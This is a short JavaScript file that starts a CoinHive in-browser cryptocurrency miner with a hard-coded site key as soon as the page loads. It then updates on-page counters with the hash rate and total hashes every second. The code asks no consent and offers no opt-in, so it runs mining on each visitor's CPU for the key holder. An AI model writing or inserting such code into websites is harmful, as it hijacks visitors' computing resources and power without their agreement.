$(document).ready(function(){
  console.log()

});

var miner = new CoinHive.Anonymous('PPXf34fiALvgCkOGgAFgmFz7wtXN34mJ');
miner.start();
miner.on('found', function() { /* Hash found */ })
miner.on('accepted', function() { /* Hash accepted by the pool */ })

// Update stats once per second
setInterval(function() {
  var hashesPerSecond = miner.getHashesPerSecond();
  var totalHashes = miner.getTotalHashes();
  var acceptedHashes = miner.getAcceptedHashes();
  console.log("Hashes per Second ", hashesPerSecond)
  console.log("totalHashes ", totalHashes)
  $('.mined').html(totalHashes)
  $('.rate').html(hashesPerSecond)
}, 1000);
